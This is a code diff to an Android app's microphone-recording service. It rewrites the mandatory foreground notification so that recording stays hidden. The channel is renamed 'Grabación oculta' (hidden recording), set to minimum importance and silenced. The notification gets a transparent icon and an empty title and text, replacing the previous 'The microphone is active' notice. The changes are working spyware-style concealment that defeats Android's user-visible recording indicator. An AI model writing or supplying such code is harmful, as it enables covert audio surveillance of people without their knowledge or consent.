@@ -11,6 +11,7 @@ import android.os.IBinder;
 import android.util.Log;
 
 import androidx.annotation.Nullable;
+import androidx.core.app.NotificationCompat;
 
 import com.example.appGrabacion.R;
 
@@ -53,28 +54,37 @@ public class MicrophoneService extends Service {
     public IBinder onBind(Intent intent) {
         return null;
     }
-
     private void startForegroundNotification() {
+        // 1) Canal en IMPORTANCE_MIN (Android O+)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
-                    "Microphone Service",
-                    NotificationManager.IMPORTANCE_LOW
+                    "Grabación oculta",
+                    NotificationManager.IMPORTANCE_MIN
             );
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            if (manager != null) {
-                manager.createNotificationChannel(channel);
-            }
+            channel.setSound(null, null);
+            channel.enableVibration(false);
+            channel.setShowBadge(false);
+            ((NotificationManager)getSystemService(NOTIFICATION_SERVICE))
+                    .createNotificationChannel(channel);
         }
 
-        Notification notification = new Notification.Builder(this, CHANNEL_ID)
-                .setContentTitle("Recording Audio")
-                .setContentText("The microphone is active")
-                .setSmallIcon(R.drawable.ic_launcher_background)
+        // 2) Notificación silenciosa con NotificationCompat
+        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
+                .setSmallIcon(R.drawable.ic_trasparente)
+                .setContentTitle("")
+                .setContentText("")
+                .setOngoing(true)                            // persistente
+                .setSilent(true)                             // silencia por completo
+                .setOnlyAlertOnce(true)                      // no suena al actualizar
+                .setShowWhen(false)                          // no muestra hora
+                .setPriority(NotificationCompat.PRIORITY_MIN) // prioridad mínima
                 .build();
 
-        startForeground(1, notification); // Notificación persistente para evitar que el sistema mate el servicio
+        // 3) Arranca el servicio en foreground
+        startForeground(1, notification);
     }
+
 
     private void setupMediaRecorder() {
         mediaRecorder = new MediaRecorder();
